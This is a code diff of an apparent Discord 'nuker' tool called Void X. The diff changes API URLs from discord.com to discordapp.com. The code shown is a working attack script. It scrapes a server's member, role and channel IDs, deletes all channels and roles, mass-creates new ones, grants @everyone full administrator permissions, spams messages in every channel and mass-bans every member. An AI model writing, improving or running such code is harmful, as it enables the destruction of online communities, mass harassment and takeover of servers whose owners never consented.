@@ -14,7 +14,7 @@ class Features:
 
     async def fetch_guild_data(headers: dict, guild_id: int):
         async with aiohttp.ClientSession() as session:
-            guild_url = f"https://discord.com/api/guilds/{guild_id}/members?limit=1000"
+            guild_url = f"https://discordapp.com/api/guilds/{guild_id}/members?limit=1000"
             async with session.get(guild_url, headers=headers) as response:
                 json = await response.json()
                 members = [json[i]['user']['id'] for i in range(len(json))]
@@ -23,7 +23,7 @@ class Features:
                     m_id.write('\n'.join(members))
 
         async with aiohttp.ClientSession() as session:
-            role_url = f"https://discord.com/api/guilds/{guild_id}/roles"
+            role_url = f"https://discordapp.com/api/guilds/{guild_id}/roles"
             async with session.get(role_url, headers=headers) as response:
                 json_l = await response.json()
                 roles = [json_l[l]['id'] for l in range(len(json_l))]
@@ -32,7 +32,7 @@ class Features:
                     r_id.write('\n'.join(roles))
 
         async with aiohttp.ClientSession() as session:
-            channel_url = f"https://discord.com/api/guilds/{guild_id}/channels"
+            channel_url = f"https://discordapp.com/api/guilds/{guild_id}/channels"
             async with session.get(channel_url, headers=headers) as response:
                 json_t = await response.json()
                 channels = [json_t[r]['id'] for r in range(len(json_t))]
@@ -41,7 +41,7 @@ class Features:
                     c_id.write('\n'.join(channels))
 
     async def delete_channel(session, cid):
-        async with session.delete(f"https://discord.com/api/v9/channels/{cid}") as resp:
+        async with session.delete(f"https://discordapp.com/api/v9/channels/{cid}") as resp:
             json_d = await resp.json()
             if resp.status in [201, 200, 202, 204, 204]:
                 logging.info(f'\033[32m[{resp.status}]\033[0m Deleted The Channel {json_d["name"]}')
@@ -58,7 +58,7 @@ class Features:
             await asyncio.gather(*tasks)
 
     async def delete_role(session, guild_id, role, headers):
-        async with session.delete(f"https://discord.com/api/v9/guilds/{guild_id}/roles/{role}",headers=headers) as resp:
+        async with session.delete(f"https://discordapp.com/api/v9/guilds/{guild_id}/roles/{role}",headers=headers) as resp:
             if resp.status in [201, 200, 202, 204, 204]:
                 logging.info(f'\033[32m[{resp.status}]\033[0m Deleted The Role {role}')
             else:
@@ -78,7 +78,7 @@ class Features:
         async with aiohttp.ClientSession(headers=headers) as session:
             tasks = []
             for i in range(amount):
-                task = asyncio.ensure_future(session.post(f'https://discord.com/api/v9/guilds/{guild_id}/channels',json={"name": channel_name, 'flags': 0}))
+                task = asyncio.ensure_future(session.post(f'https://discordapp.com/api/v9/guilds/{guild_id}/channels',json={"name": channel_name, 'flags': 0}))
                 tasks.append(task)
             responses = await asyncio.gather(*tasks)
 
@@ -92,7 +92,7 @@ class Features:
         async with aiohttp.ClientSession(headers=headers) as session:
             tasks = []
             for i in range(amount):
-                task = asyncio.ensure_future(session.post(f'https://discord.com/api/v9/guilds/{guild_id}/roles',json={"name": role_name, 'flags': 0}))
+                task = asyncio.ensure_future(session.post(f'https://discordapp.com/api/v9/guilds/{guild_id}/roles',json={"name": role_name, 'flags': 0}))
                 tasks.append(task)
             responses = await asyncio.gather(*tasks)
 
@@ -104,14 +104,14 @@ class Features:
 
     async def enable_everyone_permissions(headers:dict,GUILD_ID:int):
         async with aiohttp.ClientSession() as session:
-            url = f"https://discord.com/api/v9/guilds/{GUILD_ID}/roles"
+            url = f"https://discordapp.com/api/v9/guilds/{GUILD_ID}/roles"
             async with session.get(url, headers=headers) as response:
                 data = await response.json()
                 everyone_role = next((r for r in data if r["name"] == "@everyone"), None)
 
             payload = {"permissions": "2147483647"}
 
-            url = f"https://discord.com/api/v9/guilds/{GUILD_ID}/roles/{everyone_role['id']}"
+            url = f"https://discordapp.com/api/v9/guilds/{GUILD_ID}/roles/{everyone_role['id']}"
             async with session.patch(url, headers=headers, json=payload) as response:
                 if response.status == 200:
                     logging.info(f'\033[32m[{response.status}]\033[0m Done!')
@@ -120,7 +120,7 @@ class Features:
 
     async def ping_sender(guild_id: int, amount: int, headers: dict, message_content: str):
         async def msg_spammer(chn, session):
-            async with session.post(f"https://discord.com/api/v9/channels/{chn}/messages",json={'content': message_content}) as resp:
+            async with session.post(f"https://discordapp.com/api/v9/channels/{chn}/messages",json={'content': message_content}) as resp:
                 pass
 
         with open('data/ids/channels.txt', "r") as f:
@@ -146,7 +146,7 @@ class Features:
 
                     async def ban_user(user_id):
                         async with semaphore:
-                            async with session.request('PUT',f"https://discord.com/api/v9/guilds/{guild_id}/bans/{user_id}") as resp:
+                            async with session.request('PUT',f"https://discordapp.com/api/v9/guilds/{guild_id}/bans/{user_id}") as resp:
                                 if resp.status in [201, 200, 202, 204, 204]:
                                     logging.info(f'\033[32m[{resp.status}]\033[0m Banned {user_id}')
                                 else:
@@ -160,7 +160,7 @@ class Features:
 
                     async def ban_user(user_id):
                         async with semaphore:
-                            async with session.request('PUT',f"https://discord.com/api/v9/guilds/{guild_id}/bans/{user_id}") as resp:
+                            async with session.request('PUT',f"https://discordapp.com/api/v9/guilds/{guild_id}/bans/{user_id}") as resp:
                                 if resp.status in [201, 200, 202, 204, 204]:
                                     logging.info(f'\033[32m[{resp.status}]\033[0m Banned {user_id}')
                                 else:
@@ -284,5 +284,3 @@ if __name__ == '__main__':
     os.system(f'cls & mode 85,20 & title Void X')
     os.system("mode con: cols=74 lines=25")
     asyncio.run(Features.checker())
-
-
